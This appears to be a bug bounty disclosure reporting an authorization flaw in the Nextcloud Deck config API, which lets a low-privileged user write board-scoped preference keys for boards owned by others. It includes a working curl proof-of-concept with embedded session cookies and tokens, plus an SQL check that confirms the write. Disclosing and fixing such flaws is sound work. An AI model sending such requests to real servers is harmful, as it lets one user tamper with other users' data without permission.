  "vulnerability_information": "## Summary:\nThe Deck config API allows authenticated users to set board-scoped configuration keys for arbitrary board IDs without validating whether the user owns or has permission to manage the referenced board. I confirmed that a low-privileged user (test100_1) can successfully store board:28:notify-due in oc_preferences even though board 28 belongs to admin.\n\n## Steps To Reproduce:\n\n1. Login to Nextcloud with a low-privileged user account: test100_1\n\n2. Identify a board owned by another user\nFor example: \n- Board ID: 28\n- Owner: admin\n\n{F5516522}\n\n3. Send the configuration request. Execute the following request with your authenticated session:\n\n```\ncurl -i -X POST \\\n  'http://172.16.88.94:8081/ocs/v2.php/apps/deck/api/v1.0/config/board:28:notify-due' \\\n  -H 'OCS-APIRequest: true' \\\n  -H 'Accept: application/json' \\\n  -H 'Content-Type: application/json' \\\n  -b 'oc_sessionPassphrase=KFHmp5NgfZY%2BHJbk6pG9quGlBi2sMQPV45I%2F%2Ff7%2F0dp2xX30luSYkA3w2tkmxNQ%2B75uuu7o0D9dICjorJ5D%2Fz%2F5o32sdCW0ngwzPF3%2BDy2BxKGZJ%2BfNNSNzYSgI%2BRUTZ; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; ocrzkzhsljc2=806c5c11eef79e34c55f8a5cb157efe6; nc_username=test100_1; nc_token=MZY4g59OINcHMDawLMh%2B15zhbo0%2BnD%2FV; nc_session_id=806c5c11eef79e34c55f8a5cb157efe6' \\\n  -d '{\"value\": \"all\"}'\n```\n\n4. Observe server response\n\n{F5516519}\n\nThis indicates that the configuration value was stored successfully.\n\n5. Verify database entry. Check the oc_preferences table:\n\n```\nSELECT userid, appid, configkey, configvalue\nFROM oc_preferences\nWHERE configkey = 'board:28:notify-due';\n```\n\n{F5516521}\n\nThis confirms that the configuration key was written to the database even though the board belongs to another user.\n\n## Impact\n\nThis vulnerability allows authenticated users to set board-scoped configuration values for arbitrary board IDs, including boards owned by other users.\n\nPotential impacts include:\n\n- Unauthorized modification of board-related settings\n\n- Manipulation of notification preferences associated with other users' boards\n\n- Integrity issues in the board configuration system\n\n- Potential unexpected behavior if additional board configuration keys are introduced in future versions\n\nBecause the API trusts the board:<boardId>:<key> structure without validating board access, attackers can store arbitrary board configuration entries for any board ID.",
